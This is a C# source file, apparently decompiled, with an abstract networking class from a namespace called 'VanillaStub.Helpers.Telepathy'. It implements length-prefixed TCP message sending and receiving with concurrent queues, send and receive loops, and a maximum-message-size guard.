using System;
using System.Collections.Concurrent;
using System.Net.Sockets;
using System.Threading;

namespace VanillaStub.Helpers.Telepathy;

public abstract class Common
{
	public static int messageQueueSizeWarning = 100000;

	public int MaxMessageSize = int.MaxValue;

	public bool NoDelay = true;

	protected ConcurrentQueue<Message> receiveQueue = new ConcurrentQueue<Message>();

	public int SendTimeout = 5000;

	public int ReceiveQueueCount => receiveQueue.Count;

	public bool GetNextMessage(out Message message)
	{
		return receiveQueue.TryDequeue(out message);
	}

	protected static bool SendMessagesBlocking(NetworkStream stream, byte[][] messages)
	{
		try
		{
			int num = 0;
			for (int i = 0; i < messages.Length; i++)
			{
				num += 4 + messages[i].Length;
			}
			byte[] array = new byte[num];
			int num2 = 0;
			for (int j = 0; j < messages.Length; j++)
			{
				byte[] array2 = Utils.IntToBytesBigEndian(messages[j].Length);
				Array.Copy(array2, 0, array, num2, array2.Length);
				Array.Copy(messages[j], 0, array, num2 + array2.Length, messages[j].Length);
				num2 += array2.Length + messages[j].Length;
			}
			stream.Write(array, 0, array.Length);
			return true;
		}
		catch (Exception ex)
		{
			Logger.Log("Send: stream.Write exception: " + ex);
			return false;
		}
	}

	protected static bool ReadMessageBlocking(NetworkStream stream, int MaxMessageSize, out byte[] content)
	{
		content = null;
		byte[] array = new byte[4];
		if (!stream.ReadExactly(array, 4))
		{
			return false;
		}
		int num = Utils.BytesToIntBigEndian(array);
		if (num <= MaxMessageSize)
		{
			content = new byte[num];
			return stream.ReadExactly(content, num);
		}
		Logger.LogWarning("ReadMessageBlocking: possible allocation attack with a header of: " + num + " bytes.");
		return false;
	}

	protected static void ReceiveLoop(int connectionId, TcpClient client, ConcurrentQueue<Message> receiveQueue, int MaxMessageSize)
	{
		NetworkStream stream = client.GetStream();
		DateTime now = DateTime.Now;
		try
		{
			receiveQueue.Enqueue(new Message(connectionId, EventType.Connected, null));
			byte[] content;
			while (ReadMessageBlocking(stream, MaxMessageSize, out content))
			{
				receiveQueue.Enqueue(new Message(connectionId, EventType.Data, content));
				if (receiveQueue.Count > messageQueueSizeWarning && (DateTime.Now - now).TotalSeconds > 10.0)
				{
					Logger.LogWarning("ReceiveLoop: messageQueue is getting big(" + receiveQueue.Count + "), try calling GetNextMessage more often. You can call it more than once per frame!");
					now = DateTime.Now;
				}
			}
		}
		catch (Exception ex)
		{
			Logger.Log("ReceiveLoop: finished receive function for connectionId=" + connectionId + " reason: " + ex);
		}
		stream.Close();
		client.Close();
		receiveQueue.Enqueue(new Message(connectionId, EventType.Disconnected, null));
	}

	protected static void SendLoop(int connectionId, TcpClient client, SafeQueue<byte[]> sendQueue, ManualResetEvent sendPending)
	{
		NetworkStream stream = client.GetStream();
		try
		{
			while (client.Connected)
			{
				sendPending.Reset();
				if (!sendQueue.TryDequeueAll(out var result) || SendMessagesBlocking(stream, result))
				{
					sendPending.WaitOne();
					continue;
				}
				break;
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (ThreadInterruptedException)
		{
		}
		catch (Exception ex3)
		{
			Logger.Log("SendLoop Exception: connectionId=" + connectionId + " reason: " + ex3);
		}
	}
}
